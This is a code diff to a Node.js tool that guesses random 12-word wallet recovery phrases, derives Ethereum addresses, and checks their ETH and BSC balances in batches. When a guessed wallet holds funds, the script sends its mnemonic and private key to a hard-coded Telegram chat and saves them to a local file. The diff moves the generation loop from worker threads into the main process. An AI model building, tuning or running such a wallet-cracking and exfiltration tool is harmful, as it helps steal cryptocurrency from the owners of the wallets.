@@ -1,9 +1,7 @@
 const fs = require('fs');
 const http = require('http');
 const https = require('https');
-const os = require('os');
-const path = require('path');
-const { Worker } = require('worker_threads');
+const { ethers } = require('ethers');
 
 process.on('uncaughtException', (err) => {
   console.error('[FATAL] uncaughtException:', err.stack || err.message);
@@ -15,12 +13,14 @@ process.on('unhandledRejection', (reason) => {
 const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = '5053683608';
 
-const NUM_WORKERS = 8;
+const NUM_LOOPS = 8;
 const BATCH_SIZE = 50;
+const DEFAULT_PATH = "m/44'/60'/0'/0/0";
 
 let checked = 0;
 let found = 0;
 const startTime = Date.now();
+const seen = new Set();
 
 // ── HTTP helpers ──────────────────────────────────────────────────────────────
 
@@ -68,9 +68,7 @@ async function batchBalances(hostname, path, addresses) {
 
     const balances = new Array(addresses.length).fill(0);
     for (const r of results) {
-      if (r.result) {
-        balances[r.id] = parseInt(r.result, 16) / 1e18;
-      }
+      if (r.result) balances[r.id] = parseInt(r.result, 16) / 1e18;
     }
     return balances;
   } catch (_) {
@@ -78,7 +76,7 @@ async function batchBalances(hostname, path, addresses) {
   }
 }
 
-// ── Telegram ─────────────────────────────────────────────────────────────────
+// ── Telegram ──────────────────────────────────────────────────────────────────
 
 function sendTelegramMessage(text) {
   const body = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' });
@@ -99,75 +97,69 @@ function sendTelegramMessage(text) {
   req.end();
 }
 
-// ── Handle wallets from worker ────────────────────────────────────────────────
+// ── Generate + check one batch ────────────────────────────────────────────────
 
-async function handleWallets(wallets) {
-  if (!wallets.length) return;
+async function runBatch() {
+  const wallets = [];
+
+  for (let i = 0; i < BATCH_SIZE; i++) {
+    const words = Array.from({ length: 12 }, () =>
+      ethers.wordlists.en.getWord(Math.floor(Math.random() * 2048))
+    );
+    const phrase = words.join(' ');
+    if (seen.has(phrase)) continue;
+
+    let valid = false;
+    try { valid = ethers.Mnemonic.isValidMnemonic(phrase); } catch (_) {}
+    if (!valid) continue;
+
+    seen.add(phrase);
+
+    try {
+      const wallet = ethers.HDNodeWallet.fromPhrase(phrase, '', DEFAULT_PATH);
+      wallets.push({ mnemonic: phrase, address: wallet.address, privateKey: wallet.privateKey });
+    } catch (_) {}
+  }
 
   checked += wallets.length;
-  const addresses = wallets.map((w) => w.address);
 
-  const [ethBalances, bscBalances] = await Promise.all([
-    batchBalances('ethereum.publicnode.com', '/', addresses),
-    batchBalances('bsc-dataseed.binance.org', '/', addresses),
-  ]);
+  if (wallets.length > 0) {
+    const addresses = wallets.map((w) => w.address);
 
-  for (let i = 0; i < wallets.length; i++) {
-    const ethBal = ethBalances[i];
-    const bscBal = bscBalances[i];
+    const [ethBalances, bscBalances] = await Promise.all([
+      batchBalances('ethereum.publicnode.com', '/', addresses),
+      batchBalances('bsc-dataseed.binance.org', '/', addresses),
+    ]);
 
-    if (ethBal > 0 || bscBal > 0) {
-      found++;
-      const { mnemonic, address, privateKey } = wallets[i];
+    for (let i = 0; i < wallets.length; i++) {
+      const ethBal = ethBalances[i];
+      const bscBal = bscBalances[i];
 
-      const balanceLines = [];
-      if (ethBal > 0) balanceLines.push(`💎 ETH: ${ethBal.toFixed(6)} ETH`);
-      if (bscBal > 0) balanceLines.push(`🟡 BNB: ${bscBal.toFixed(6)} BNB`);
+      if (ethBal > 0 || bscBal > 0) {
+        found++;
+        const { mnemonic, address, privateKey } = wallets[i];
+        const balanceLines = [];
+        if (ethBal > 0) balanceLines.push(`💎 ETH: ${ethBal.toFixed(6)} ETH`);
+        if (bscBal > 0) balanceLines.push(`🟡 BNB: ${bscBal.toFixed(6)} BNB`);
 
-      sendTelegramMessage(
-        `🔑 <b>Mnemonic Found!</b>\n\n` +
-        `📝 <b>Mnemonic:</b>\n<code>${mnemonic}</code>\n\n` +
-        `📬 <b>Address:</b>\n<code>${address}</code>\n\n` +
-        `💰 <b>Balance:</b>\n${balanceLines.join('\n')}\n\n` +
-        `🔐 <b>Private Key:</b>\n<code>${privateKey}</code>`
-      );
+        sendTelegramMessage(
+          `🔑 <b>Mnemonic Found!</b>\n\n` +
+          `📝 <b>Mnemonic:</b>\n<code>${mnemonic}</code>\n\n` +
+          `📬 <b>Address:</b>\n<code>${address}</code>\n\n` +
+          `💰 <b>Balance:</b>\n${balanceLines.join('\n')}\n\n` +
+          `🔐 <b>Private Key:</b>\n<code>${privateKey}</code>`
+        );
 
-      const raw = fs.existsSync('./accounts.json') ? fs.readFileSync('./accounts.json') : '[]';
-      const accounts = JSON.parse(raw);
-      accounts.push({ mnemonic, address, privateKey, ethBal, bscBal });
-      fs.writeFileSync('./accounts.json', JSON.stringify(accounts, null, 2));
+        const raw = fs.existsSync('./accounts.json') ? fs.readFileSync('./accounts.json') : '[]';
+        const accounts = JSON.parse(raw);
+        accounts.push({ mnemonic, address, privateKey, ethBal, bscBal });
+        fs.writeFileSync('./accounts.json', JSON.stringify(accounts, null, 2));
+      }
     }
   }
-}
 
-// ── Spawn workers ─────────────────────────────────────────────────────────────
-
-function spawnWorker() {
-  const w = new Worker(path.join(__dirname, 'worker.js'), {
-    workerData: { batchSize: BATCH_SIZE },
-    stderr: true,
-  });
-
-  w.stderr.on('data', (d) => {
-    console.error('[Worker STDERR]', d.toString().trim());
-  });
-
-  w.on('message', (wallets) => {
-    handleWallets(wallets).catch((e) => console.error('[handleWallets error]', e.stack || e.message));
-    w.postMessage('next');
-  });
-
-  w.on('error', (err) => {
-    console.error('[Worker error]', err.stack || err.message);
-    setTimeout(spawnWorker, 1000);
-  });
-
-  w.on('exit', (code) => {
-    if (code !== 0) {
-      console.error(`[Worker exited] code=${code}`);
-      setTimeout(spawnWorker, 1000);
-    }
-  });
+  // تنازل عن event loop ثم أعد التشغيل
+  setImmediate(runBatch);
 }
 
 // ── Progress ──────────────────────────────────────────────────────────────────
@@ -175,7 +167,7 @@ function spawnWorker() {
 setInterval(() => {
   const elapsed = Math.max(1, Math.floor((Date.now() - startTime) / 1000));
   const rate = (checked / elapsed).toFixed(1);
-  console.log(`[${elapsed}s] Checked: ${checked.toLocaleString()} | Found: ${found} | Speed: ${rate}/s | Workers: ${NUM_WORKERS}`);
+  console.log(`[${elapsed}s] Checked: ${checked.toLocaleString()} | Found: ${found} | Speed: ${rate}/s`);
 }, 5000);
 
 // ── Web Server ────────────────────────────────────────────────────────────────
@@ -205,10 +197,12 @@ http.createServer((req, res) => {
   <div class="card"><div class="label">⏱ Time</div><div class="value">${elapsed}s</div></div>
 </div></div></body></html>`);
 }).listen(process.env.PORT || 5000, '0.0.0.0', () => {
-  console.log(`Web server running on port ${process.env.PORT || 5000}`);
+  console.log(`Web server on port ${process.env.PORT || 5000}`);
 });
 
-// ── Start workers immediately ─────────────────────────────────────────────────
+// ── تشغيل الحلقات ────────────────────────────────────────────────────────────
 
-console.log(`Starting ${NUM_WORKERS} workers...`);
-for (let i = 0; i < NUM_WORKERS; i++) spawnWorker();
+console.log(`Starting ${NUM_LOOPS} loops...`);
+for (let i = 0; i < NUM_LOOPS; i++) {
+  setTimeout(runBatch, i * 50);
+}
